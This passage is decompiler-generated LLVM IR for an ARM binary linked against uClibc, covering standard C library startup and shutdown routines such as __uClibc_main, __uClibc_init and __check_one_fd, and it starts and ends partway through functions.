  store i1 %v3_130b4, i1* %cpsr_c.global-to-local, align 1
  %v9_130b4 = icmp eq i32 %v2_130b0, %v1_130b4.pre
  br i1 %v9_130b4, label %dec_label_pc_130bc, label %dec_label_pc_130d4

dec_label_pc_130d0:                               ; preds = %dec_label_pc_130bc
  %v0_130d0 = load i32, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_130d4

dec_label_pc_130d4:                               ; preds = %dec_label_pc_130a0, %dec_label_pc_130bc.dec_label_pc_130b0_crit_edge, %dec_label_pc_130d0
  %v0_130d4 = phi i32 [ %v0_130d0, %dec_label_pc_130d0 ], [ %v2_130b023, %dec_label_pc_130a0 ], [ %v2_130b0, %dec_label_pc_130bc.dec_label_pc_130b0_crit_edge ]
  %v1_130d4 = phi i32 [ %v0_130d0, %dec_label_pc_130d0 ], [ %v3_130a0, %dec_label_pc_130a0 ], [ %v1_130b4.pre, %dec_label_pc_130bc.dec_label_pc_130b0_crit_edge ]
  %v3_130d4 = icmp uge i32 %v0_130d4, %v1_130d4
  store i1 %v3_130d4, i1* %cpsr_c.global-to-local, align 1
  %v9_130d4 = icmp eq i32 %v0_130d4, %v1_130d4
  br i1 %v9_130d4, label %dec_label_pc_130dc, label %dec_label_pc_130d4.dec_label_pc_130a0_crit_edge

dec_label_pc_130d4.dec_label_pc_130a0_crit_edge:  ; preds = %dec_label_pc_130d4
  %v0_130a4.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_130a0

dec_label_pc_130dc:                               ; preds = %dec_label_pc_130d4
  store i32 116, i32* @r3, align 4
  %v0_130e4 = load i32, i32* %r8.global-to-local, align 4
  %v2_130e4 = add i32 %v0_130e4, 116
  %v3_130e4 = inttoptr i32 %v2_130e4 to i32*
  %v4_130e4 = load i32, i32* %v3_130e4, align 4
  store i32 %v4_130e4, i32* @ip, align 4
  call void @__pseudo_branch(i32 %v4_130e4)
  %v0_130f0.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_130f0

dec_label_pc_130f0:                               ; preds = %entry, %bb, %dec_label_pc_13088, %dec_label_pc_130dc
  %v0_130f0 = phi i32 [ %v1_13080, %dec_label_pc_13088 ], [ %v0_130f0.pre, %dec_label_pc_130dc ], [ %v3_13034, %entry ], [ %v1_13080, %bb ]
  %v2_130f4 = load i32, i32* %stack_var_-24, align 4
  store i32 %v2_130f4, i32* @r4, align 4
  ret i32 %v0_130f0

; uselistorder directives
  uselistorder i32 %v0_130d0, { 1, 0 }
  uselistorder i32 %v1_130b4.pre, { 0, 2, 1 }
  uselistorder i32 %v1_13040, { 1, 2, 0 }
  uselistorder i32 %v1_1307c, { 1, 0 }
  uselistorder i32 %v1_13080, { 0, 1, 4, 3, 5, 6, 7, 2 }
  uselistorder i32 %v1_1305c.pre, { 1, 0 }
  uselistorder i32 %v0_1305450, { 2, 1, 0 }
  uselistorder i32* %r7.global-to-local, { 1, 2, 0, 3 }
  uselistorder i32* %r6.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32* %r5.global-to-local, { 1, 2, 3, 4, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 0, 2, 4, 3, 5 }
  uselistorder i32* %r2.global-to-local, { 0, 1, 3, 2, 4 }
  uselistorder i1* %cpsr_c.global-to-local, { 3, 5, 4, 0, 6, 10, 7, 9, 8, 1, 2 }
  uselistorder i32 -1036, { 1, 2, 0 }
  uselistorder label %dec_label_pc_130f0, { 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_130d4, { 2, 1, 0 }
  uselistorder label %dec_label_pc_130bc, { 1, 0 }
  uselistorder label %dec_label_pc_1307c, { 2, 1, 0 }
  uselistorder label %dec_label_pc_13064, { 1, 0 }
  uselistorder label %dec_label_pc_1304c, { 1, 0 }
}

define i32 @__pthread_return_0() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @__pthread_mutex_init() local_unnamed_addr {
entry:
  ret i32 0
}

define i32 @_pthread_cleanup_push_defer(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %arg2, i32* %arg1, align 4
  %v3_13114 = add i32 %tmp, 4
  %v4_13114 = inttoptr i32 %v3_13114 to i32*
  store i32 %arg3, i32* %v4_13114, align 4
  ret i32 %tmp
}

define i32 @_pthread_cleanup_pop_restore(i32* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r0.global-to-local, align 4
  %v2_13120 = icmp eq i32 %arg2, 0
  br i1 %v2_13120, label %.thread1, label %bb

bb:                                               ; preds = %entry
  %v2_1312c = add i32 %tmp, 4
  %v3_1312c = inttoptr i32 %v2_1312c to i32*
  %v4_1312c = load i32, i32* %v3_1312c, align 4
  store i32 %v4_1312c, i32* %r0.global-to-local, align 4
  %v3_13130 = load i32, i32* %arg1, align 4
  br label %.thread1

.thread1:                                         ; preds = %entry, %bb
  %.02 = phi i32 [ %v3_13130, %bb ], [ undef, %entry ]
  %v2_13138 = xor i1 %v2_13120, true
  call void @__pseudo_cond_branch(i1 %v2_13138, i32 %.02)
  %v1_13144 = load i32, i32* %r0.global-to-local, align 4
  ret i32 %v1_13144

; uselistorder directives
  uselistorder i32* %r0.global-to-local, { 1, 2, 0 }
  uselistorder label %.thread1, { 1, 0 }
}

define i32 @__GI___uClibc_fini() local_unnamed_addr {
dec_label_pc_1316c.lr.ph:
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  %v3_13148 = load i32, i32* @r4, align 4
  store i32 %v3_13148, i32* %stack_var_-16, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r5.global-to-local, align 4
  store i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 -8), i32* %r6.global-to-local, align 4
  store i32 0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_1316c

dec_label_pc_1316c:                               ; preds = %dec_label_pc_1316c.dec_label_pc_1316c_crit_edge, %dec_label_pc_1316c.lr.ph
  %v1_1316c = phi i32 [ %v1_13178, %dec_label_pc_1316c.dec_label_pc_1316c_crit_edge ], [ 0, %dec_label_pc_1316c.lr.ph ]
  %v0_1316c = phi i32 [ %v0_1316c.pre, %dec_label_pc_1316c.dec_label_pc_1316c_crit_edge ], [ add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 -8), %dec_label_pc_1316c.lr.ph ]
  %v4_1316c = mul i32 %v1_1316c, 4
  %v5_1316c = add i32 %v4_1316c, %v0_1316c
  %v6_1316c = inttoptr i32 %v5_1316c to i32*
  %v7_1316c = load i32, i32* %v6_1316c, align 4
  call void @__pseudo_branch(i32 %v7_1316c)
  %v0_13178 = load i32, i32* %r4.global-to-local, align 4
  %v1_13178 = add i32 %v0_13178, -1
  store i32 %v1_13178, i32* %r4.global-to-local, align 4
  %v2_13178 = icmp eq i32 %v0_13178, 0
  br i1 %v2_13178, label %dec_label_pc_13180, label %dec_label_pc_1316c.dec_label_pc_1316c_crit_edge

dec_label_pc_1316c.dec_label_pc_1316c_crit_edge:  ; preds = %dec_label_pc_1316c
  %v0_1316c.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1316c

dec_label_pc_13180:                               ; preds = %dec_label_pc_1316c
  %v0_13184.pre = load i32, i32* %r5.global-to-local, align 4
  %v2_13184 = add i32 %v0_13184.pre, 2000
  %v3_13184 = inttoptr i32 %v2_13184 to i32*
  %v4_13184 = load i32, i32* %v3_13184, align 4
  %v2_13188 = icmp eq i32 %v4_13184, 0
  br i1 %v2_13188, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_13180
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_13180, %bb
  %v2_13190 = xor i1 %v2_13188, true
  call void @__pseudo_cond_branch(i1 %v2_13190, i32 %v4_13184)
  %v0_13198 = load i32, i32* %r5.global-to-local, align 4
  %v2_13198 = add i32 %v0_13198, 2004
  %v3_13198 = inttoptr i32 %v2_13198 to i32*
  %v4_13198 = load i32, i32* %v3_13198, align 4
  %v2_1319c = icmp eq i32 %v4_13198, 0
  br i1 %v2_1319c, label %bb19, label %bb18

bb18:                                             ; preds = %bb17
  br label %bb19

bb19:                                             ; preds = %bb17, %bb18
  %v2_131a4 = xor i1 %v2_1319c, true
  call void @__pseudo_cond_branch(i1 %v2_131a4, i32 %v4_13198)
  %v2_131a8 = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_131a8, i32* %r4.global-to-local, align 4
  %v1_131ac = load i32, i32* @r0, align 4
  ret i32 %v1_131ac

; uselistorder directives
  uselistorder i32 %v1_13178, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r4.global-to-local, { 1, 3, 2, 0 }
  uselistorder label %bb19, { 1, 0 }
  uselistorder label %bb17, { 1, 0 }
}

define i32 @__check_one_fd(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v3_131c4 = load i32, i32* @r4, align 4
  %v6_131c4 = load i32, i32* @r5, align 4
  store i32 %arg2, i32* @r5, align 4
  store i32 %arg1, i32* @r4, align 4
  %v2_131d8 = call i32 @__libc_fcntl(i32 %arg1, i32 1)
  %v3_131e0 = icmp eq i32 %v2_131d8, -1
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* @r3, align 4
  br i1 %v3_131e0, label %dec_label_pc_131ec, label %dec_label_pc_13204

dec_label_pc_131ec:                               ; preds = %entry
  %v0_131f0 = load i32, i32* @r5, align 4
  %v2_131f8 = inttoptr i32 %v0_131f0 to i64*
  %v3_131f8 = call i32 @__libc_open(i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 -33940), i64* %v2_131f8)
  %v1_131fc = load i32, i32* @r4, align 4
  %v1_13200 = icmp ne i32 %v3_131f8, %v1_131fc
  call void @__pseudo_cond_branch(i1 %v1_13200, i32 ptrtoint (i32* @global_var_11d38.772 to i32))
  br label %dec_label_pc_13204

dec_label_pc_13204:                               ; preds = %entry, %dec_label_pc_131ec
  %v1_1320c = phi i32 [ %v2_131d8, %entry ], [ %v3_131f8, %dec_label_pc_131ec ]
  store i32 %v3_131c4, i32* @r4, align 4
  store i32 %v6_131c4, i32* @r5, align 4
  ret i32 %v1_1320c

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_13204, { 1, 0 }
}

define i32 @__GI___uClibc_init(i32 %arg1) local_unnamed_addr {
entry:
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_13218 = load i32, i32* @r4, align 4
  store i32 %v3_13218, i32* %stack_var_-8, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r4.global-to-local, align 4
  %v4_13228 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 148) to i32*), align 4
  %v1_1322c = inttoptr i32 %v4_13228 to i32*
  %v2_1322c = load i32, i32* %v1_1322c, align 4
  %v2_13230 = icmp eq i32 %v2_1322c, 0
  br i1 %v2_13230, label %dec_label_pc_13238, label %dec_label_pc_1325c

dec_label_pc_13238:                               ; preds = %entry
  store i32 4096, i32* %v1_1322c, align 4
  %v0_13240 = call i32 @__pthread_initialize_minimal()
  %v0_13248 = load i32, i32* %r4.global-to-local, align 4
  %v2_13248 = add i32 %v0_13248, -49720
  %v2_13250 = icmp eq i32 %v2_13248, 0
  br i1 %v2_13250, label %bb4, label %bb

bb:                                               ; preds = %dec_label_pc_13238
  br label %bb4

bb4:                                              ; preds = %dec_label_pc_13238, %bb
  %v2_13258 = xor i1 %v2_13250, true
  call void @__pseudo_cond_branch(i1 %v2_13258, i32 %v2_13248)
  %v2_1325c.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1325c

dec_label_pc_1325c:                               ; preds = %entry, %bb4
  %v2_1325c = phi i32 [ %v2_1325c.pre, %bb4 ], [ %v3_13218, %entry ]
  %.0 = phi i32 [ %v0_13240, %bb4 ], [ undef, %entry ]
  store i32 %v2_1325c, i32* %r4.global-to-local, align 4
  ret i32 %.0

; uselistorder directives
  uselistorder i32 undef, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1325c, { 1, 0 }
  uselistorder label %bb4, { 1, 0 }
}

define i32 @__uClibc_main(i32 %arg1, i32 %arg2, i32* %arg3, i32 %arg4, i32 %arg5, i32 %arg6, i32 %arg7) local_unnamed_addr {
entry:
  %cpsr_c.global-to-local = alloca i1, align 1
  %cpsr_z.global-to-local = alloca i1, align 1
  %ip.global-to-local = alloca i32, align 4
  %r0.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg4, i32* %r3.global-to-local, align 4
  %tmp = ptrtoint i32* %arg3 to i32
  store i32 %tmp, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  store i32 %arg1, i32* %r0.global-to-local, align 4
  %tmp62 = call i32 @__decompiler_undefined_function_0()
  %tmp63 = call i32 @__decompiler_undefined_function_0()
  %tmp64 = call i32 @__decompiler_undefined_function_0()
  %tmp65 = call i32 @__decompiler_undefined_function_0()
  %tmp66 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-400 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-416 = alloca i32, align 4
  store i32 55908, i32* %r4.global-to-local, align 4
  %v1_1327c = add i32 %tmp, 4
  store i32 %v1_1327c, i32* %ip.global-to-local, align 4
  %v2_13280 = load i32, i32* %arg3, align 4
  store i32 24, i32* %r2.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %r4.global-to-local, align 4
  %v3_1328c = mul i32 %arg2, 4
  store i32 %v3_1328c, i32* @r7, align 4
  %v4_13294 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 24) to i32*), align 4
  store i32 %v4_13294, i32* %r1.global-to-local, align 4
  store i32 56, i32* %r2.global-to-local, align 4
  %v2_1329c = add i32 %v1_1327c, %v3_1328c
  store i32 %v2_1329c, i32* %ip.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32* %stack_var_-416, align 4
  %v4_132a4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_20cf4.602 to i32), i32 56) to i32*), align 4
  store i32 %v4_132a4, i32* %r4.global-to-local, align 4
  %v3_132a8 = icmp uge i32 %v2_1329c, %v2_13280
  store i1 %v3_132a8, i1* %cpsr_c.global-to-local, align 1
  %v9_132a8 = icmp eq i32 %v2_1329c, %v2_13280
  store i1 %v9_132a8, i1* %cpsr_z.global-to-local, align 1
  store i32 %arg7, i32* %r2.global-to-local, align 4
  %v2_132b0 = inttoptr i32 %v4_132a4 to i32*
  store i32 %v2_1329c, i32* %v2_132b0, align 4
  br i1 %v9_132a8, label %bb, label %bb75

bb:                                               ; preds = %entry
  store i32 %tmp, i32* %ip.global-to-local, align 4
  br label %bb75

bb75:                                             ; preds = %entry, %bb
  %v0_132b8 = load i32, i32* %r2.global-to-local, align 4
  %v1_132b8 = load i32, i32* %r1.global-to-local, align 4
  %v2_132b8 = inttoptr i32 %v1_132b8 to i32*
  store i32 %v0_132b8, i32* %v2_132b8, align 4
  %v2_132bc = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_132bc, i32* %r5.global-to-local, align 4
  store i32 %arg6, i32* %r1.global-to-local, align 4
  store i32 2004, i32* %r2.global-to-local, align 4
  %v0_132c8 = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_132c8, i32* @r6, align 4
  br i1 %v9_132a8, label %bb76, label %.thread52

.thread52:                                        ; preds = %bb75
  %v3_132d053 = add i32 %v2_132bc, 2004
  %v4_132d054 = inttoptr i32 %v3_132d053 to i32*
  store i32 %arg6, i32* %v4_132d054, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  br label %bb77

bb76:                                             ; preds = %bb75
  %v1_132cc = load i32, i32* %ip.global-to-local, align 4
  %v2_132cc = load i32, i32* @r7, align 4
  %v3_132cc = add i32 %v2_132cc, %v1_132cc
  store i32 %v3_132cc, i32* %r3.global-to-local, align 4
  %v3_132d050 = add i32 %v2_132bc, 2004
  %v4_132d051 = inttoptr i32 %v3_132d050 to i32*
  store i32 %arg6, i32* %v4_132d051, align 4
  store i32 0, i32* %r1.global-to-local, align 4
  %v1_132dc = load i32, i32* %r3.global-to-local, align 4
  %v2_132dc = load i32, i32* %r4.global-to-local, align 4
  %v3_132dc = inttoptr i32 %v2_132dc to i32*
  store i32 %v1_132dc, i32* %v3_132dc, align 4
  br label %bb77

bb77:                                             ; preds = %.thread52, %bb76
  %v2_132e0 = ptrtoint i32* %stack_var_-120 to i32
  store i32 %v2_132e0, i32* %r0.global-to-local, align 4
  store i32 120, i32* %r2.global-to-local, align 4
  %v3_132e8 = bitcast i32* %stack_var_-120 to i8*
  %v4_132e8 = call i32 @__GI_memset(i8* %v3_132e8, i32 0, i32 120)
  store i32 %v4_132e8, i32* %r0.global-to-local, align 4
  %v0_132ec = load i32, i32* %r4.global-to-local, align 4
  %v1_132ec = inttoptr i32 %v0_132ec to i32*
  %v2_132ec = load i32, i32* %v1_132ec, align 4
  br label %dec_label_pc_132f8

dec_label_pc_132f8:                               ; preds = %dec_label_pc_132f8, %bb77
  %storemerge = phi i32 [ %v2_132ec, %bb77 ], [ %v1_13304, %dec_label_pc_132f8 ]
  store i32 %storemerge, i32* %r1.global-to-local, align 4
  %v1_132f8 = inttoptr i32 %storemerge to i32*
  %v2_132f8 = load i32, i32* %v1_132f8, align 4
  store i32 %v2_132f8, i32* %r3.global-to-local, align 4
  %v2_132fc = icmp eq i32 %v2_132f8, 0
  %v1_13304 = add i32 %storemerge, 4
  br i1 %v2_132fc, label %dec_label_pc_13304, label %dec_label_pc_132f8

dec_label_pc_13304:                               ; preds = %dec_label_pc_132f8
  store i32 %v1_13304, i32* @r4, align 4
  store i32 %v2_132e0, i32* @r5, align 4
  %v1_1332830 = inttoptr i32 %v1_13304 to i32*
  %v2_1332831 = load i32, i32* %v1_1332830, align 4
  store i32 %v2_1332831, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1332c33 = icmp eq i32 %v2_1332831, 0
  store i1 %v2_1332c33, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1332c33, label %dec_label_pc_13334, label %dec_label_pc_13310

dec_label_pc_13310:                               ; preds = %dec_label_pc_13304, %dec_label_pc_13328
  %v4_13318 = phi i32 [ %v1_13324, %dec_label_pc_13328 ], [ %v1_13304, %dec_label_pc_13304 ]
  %v5_13314 = phi i32 [ %v2_13328, %dec_label_pc_13328 ], [ %v2_1332831, %dec_label_pc_13304 ]
  %v2_13310 = icmp ugt i32 %v5_13314, 13
  store i1 %v2_13310, i1* %cpsr_c.global-to-local, align 1
  %v7_13310 = icmp eq i32 %v5_13314, 14
  store i1 %v7_13310, i1* %cpsr_z.global-to-local, align 1
  %v2_13314 = xor i1 %v2_13310, true
  %v3_13314 = or i1 %v7_13310, %v2_13314
  br i1 %v3_13314, label %bb78, label %bb79

bb78:                                             ; preds = %dec_label_pc_13310
  %v4_13314 = load i32, i32* @r5, align 4
  %v6_13314 = and i32 %v5_13314, 536870912
  %v7_13314 = icmp ne i32 %v6_13314, 0
  store i1 %v7_13314, i1* %cpsr_c.global-to-local, align 1
  %v8_13314 = mul i32 %v5_13314, 8
  %v9_13314 = add i32 %v4_13314, %v8_13314
  store i32 %v9_13314, i32* %r0.global-to-local, align 4
  br label %bb79

bb79:                                             ; preds = %dec_label_pc_13310, %bb78
  %v1_13320 = phi i1 [ %v2_13310, %dec_label_pc_13310 ], [ %v7_13314, %bb78 ]
  %v2_13318 = xor i1 %v1_13320, true
  %v3_13318 = or i1 %v7_13310, %v2_13318
  br i1 %v3_13318, label %bb80, label %dec_label_pc_13328

bb80:                                             ; preds = %bb79
  store i32 %v4_13318, i32* %r1.global-to-local, align 4
  store i32 8, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_13328

dec_label_pc_13328:                               ; preds = %bb79, %bb80
  call void @__pseudo_cond_branch(i1 %v3_13318, i32 ptrtoint (i32* @global_var_10190.780 to i32))
  %v0_13324 = load i32, i32* @r4, align 4
  %v1_13324 = add i32 %v0_13324, 8
  store i32 %v1_13324, i32* @r4, align 4
  %v1_13328 = inttoptr i32 %v1_13324 to i32*
  %v2_13328 = load i32, i32* %v1_13328, align 4
  store i32 %v2_13328, i32* %r3.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_1332c = icmp eq i32 %v2_13328, 0
  store i1 %v2_1332c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_1332c, label %dec_label_pc_13334, label %dec_label_pc_13310

dec_label_pc_13334:                               ; preds = %dec_label_pc_13328, %dec_label_pc_13304
  store i32 %v2_132e0, i32* %r0.global-to-local, align 4
  %v1_13338 = call i32 @_dl_aux_init(i32 %v2_132e0)
  store i32 %v1_13338, i32* %r0.global-to-local, align 4
  %v1_1333c = call i32 @__GI___uClibc_init(i32 %v1_13338)
  store i32 %v1_1333c, i32* @r0, align 4
  store i32 148, i32* %r3.global-to-local, align 4
  %v2_13344 = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_13344, i32* @lr, align 4
  store i32 %tmp66, i32* @r2, align 4
  %v2_1334c = add i32 %v2_13344, 148
  %v3_1334c = inttoptr i32 %v2_1334c to i32*
  %v4_1334c = load i32, i32* %v3_1334c, align 4
  store i32 %v4_1334c, i32* %r1.global-to-local, align 4
  store i32 %tmp65, i32* @r3, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13354 = icmp eq i32 %tmp66, 0
  store i1 %v2_13354, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_13354, label %bb81, label %bb82

bb81:                                             ; preds = %dec_label_pc_13334
  store i32 4096, i32* @r2, align 4
  br label %bb82

bb82:                                             ; preds = %dec_label_pc_13334, %bb81
  %v0_13360 = phi i32 [ %tmp66, %dec_label_pc_13334 ], [ 4096, %bb81 ]
  %v3_1335c = icmp eq i32 %tmp65, -1
  store i1 %v3_1335c, i1* %cpsr_c.global-to-local, align 1
  %v8_1335c = icmp eq i32 %tmp65, -1
  store i1 %v8_1335c, i1* %cpsr_z.global-to-local, align 1
  %v2_13360 = inttoptr i32 %v4_1334c to i32*
  store i32 %v0_13360, i32* %v2_13360, align 4
  br i1 %v3_1335c, label %dec_label_pc_13368, label %dec_label_pc_13390

dec_label_pc_13368:                               ; preds = %bb82
  %v0_13368 = call i32 @getuid()
  store i32 %v0_13368, i32* @r0, align 4
  store i32 %v0_13368, i32* %r4.global-to-local, align 4
  %v0_13370 = call i32 @geteuid()
  store i32 %v0_13370, i32* @r0, align 4
  %v3_13374 = icmp uge i32 %v0_13368, %v0_13370
  store i1 %v3_13374, i1* %cpsr_c.global-to-local, align 1
  %v9_13374 = icmp eq i32 %v0_13368, %v0_13370
  store i1 %v9_13374, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13374, label %dec_label_pc_1337c, label %dec_label_pc_133b8

dec_label_pc_1337c:                               ; preds = %dec_label_pc_13368
  %v1_1337c = call i32 @getgid(i32 %v0_13370)
  store i32 %v1_1337c, i32* @r0, align 4
  store i32 %v1_1337c, i32* %r4.global-to-local, align 4
  %v0_13384 = call i32 @getegid()
  store i32 %v0_13384, i32* %r0.global-to-local, align 4
  %v3_13388 = icmp uge i32 %v1_1337c, %v0_13384
  store i1 %v3_13388, i1* %cpsr_c.global-to-local, align 1
  %v9_13388 = icmp eq i32 %v1_1337c, %v0_13384
  store i1 %v9_13388, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_13388, label %dec_label_pc_13390, label %dec_label_pc_133b8

dec_label_pc_13390:                               ; preds = %dec_label_pc_1337c, %bb82
  store i32 %tmp65, i32* @r2, align 4
  store i1 %v3_1335c, i1* %cpsr_c.global-to-local, align 1
  store i1 %v8_1335c, i1* %cpsr_z.global-to-local, align 1
  br i1 %v8_1335c, label %dec_label_pc_133e0, label %dec_label_pc_1339c

dec_label_pc_1339c:                               ; preds = %dec_label_pc_13390
  store i32 %tmp64, i32* @r3, align 4
  %v3_133a0 = icmp uge i32 %tmp65, %tmp64
  store i1 %v3_133a0, i1* %cpsr_c.global-to-local, align 1
  %v9_133a0 = icmp eq i32 %tmp65, %tmp64
  store i1 %v9_133a0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_133a0, label %dec_label_pc_133a8, label %dec_label_pc_133b8

dec_label_pc_133a8:                               ; preds = %dec_label_pc_1339c
  store i32 %tmp63, i32* @r2, align 4
  store i32 %tmp62, i32* @r3, align 4
  %v3_133b0 = icmp uge i32 %tmp63, %tmp62
  store i1 %v3_133b0, i1* %cpsr_c.global-to-local, align 1
  %v9_133b0 = icmp eq i32 %tmp63, %tmp62
  store i1 %v9_133b0, i1* %cpsr_z.global-to-local, align 1
  br i1 %v9_133b0, label %dec_label_pc_133e0, label %dec_label_pc_133b8

dec_label_pc_133b8:                               ; preds = %dec_label_pc_1339c, %dec_label_pc_1337c, %dec_label_pc_13368, %dec_label_pc_133a8
  store i32 32770, i32* @r4, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 32768, i32* %r1.global-to-local, align 4
  %v2_133c4 = call i32 @__check_one_fd(i32 0, i32 32768)
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_133cc = load i32, i32* @r4, align 4
  store i32 %v0_133cc, i32* %r1.global-to-local, align 4
  %v2_133d0 = call i32 @__check_one_fd(i32 1, i32 %v0_133cc)
  %v0_133d4 = load i32, i32* @r4, align 4
  store i32 %v0_133d4, i32* %r1.global-to-local, align 4
  store i32 2, i32* %r0.global-to-local, align 4
  %v2_133dc = call i32 @__check_one_fd(i32 2, i32 %v0_133d4)
  store i32 %v2_133dc, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_133e0

dec_label_pc_133e0:                               ; preds = %dec_label_pc_133a8, %dec_label_pc_13390, %dec_label_pc_133b8
  store i32 %tmp, i32* %r0.global-to-local, align 4
  store i32 260, i32* %r3.global-to-local, align 4
  %v2_133e8 = load i32, i32* %arg3, align 4
  store i32 %v2_133e8, i32* %r2.global-to-local, align 4
  %v2_133ec = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_133ec, i32* %r1.global-to-local, align 4
  %v3_133f0 = add i32 %v2_133ec, 260
  %v4_133f0 = inttoptr i32 %v3_133f0 to i32*
  store i32 %v2_133e8, i32* %v4_133f0, align 4
  %v0_133f4 = load i32, i32* %r0.global-to-local, align 4
  %v1_133f4 = inttoptr i32 %v0_133f4 to i32*
  %v2_133f4 = load i32, i32* %v1_133f4, align 4
  store i32 %v2_133f4, i32* @r4, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_133f8 = icmp eq i32 %v2_133f4, 0
  store i1 %v2_133f8, i1* %cpsr_z.global-to-local, align 1
  br i1 %v2_133f8, label %bb84, label %dec_label_pc_13400

dec_label_pc_13400:                               ; preds = %dec_label_pc_133e0
  store i32 164, i32* %r3.global-to-local, align 4
  %v0_13404 = load i32, i32* %r1.global-to-local, align 4
  %v2_13404 = add i32 %v0_13404, 164
  %v3_13404 = inttoptr i32 %v2_13404 to i32*
  %v4_13404 = load i32, i32* %v3_13404, align 4
  store i32 %v4_13404, i32* %r3.global-to-local, align 4
  %v2_13408 = inttoptr i32 %v4_13404 to i32*
  store i32 %v2_133f4, i32* %v2_13408, align 4
  store i32 47, i32* %r1.global-to-local, align 4
  %v0_13410 = load i32, i32* %r0.global-to-local, align 4
  %v1_13410 = inttoptr i32 %v0_13410 to i32*
  %v2_13410 = load i32, i32* %v1_13410, align 4
  store i32 %v2_13410, i32* %r0.global-to-local, align 4
  %v4_13414 = call i32 @__GI_strrchr(i32 %v2_13410, i32 47, i32 %v2_133e8, i32 %v4_13404)
  store i32 %v4_13414, i32* %r0.global-to-local, align 4
  store i32 96, i32* %r3.global-to-local, align 4
  %v2_1341c = load i32, i32* %stack_var_-416, align 4
  store i32 %v2_1341c, i32* %r5.global-to-local, align 4
  store i1 true, i1* %cpsr_c.global-to-local, align 1
  %v2_13420 = icmp eq i32 %v4_13414, 0
  store i1 %v2_13420, i1* %cpsr_z.global-to-local, align 1
  %v2_13424 = add i32 %v2_1341c, 96
  %v3_13424 = inttoptr i32 %v2_13424 to i32*
  %v4_13424 = load i32, i32* %v3_13424, align 4
  store i32 %v4_13424, i32* %r2.global-to-local, align 4
  br i1 %v2_13420, label %.thread57, label %bb83

.thread57:                                        ; preds = %dec_label_pc_13400
  %v2_1342c58 = inttoptr i32 %v4_13424 to i32*
  store i32 0, i32* %v2_1342c58, align 4
  br label %bb84

bb83:                                             ; preds = %dec_label_pc_13400
  %v2_13428 = add i32 %v4_13414, 1
  store i32 %v2_13428, i32* %r3.global-to-local, align 4
  %v2_1342c = inttoptr i32 %v4_13424 to i32*
  store i32 %v4_13414, i32* %v2_1342c, align 4
  %v1_13430 = load i32, i32* %r3.global-to-local, align 4
  %v2_13430 = load i32, i32* %r2.global-to-local, align 4
  %v3_13430 = inttoptr i32 %v2_13430 to i32*
  store i32 %v1_13430, i32* %v3_13430, align 4
  br label %bb84

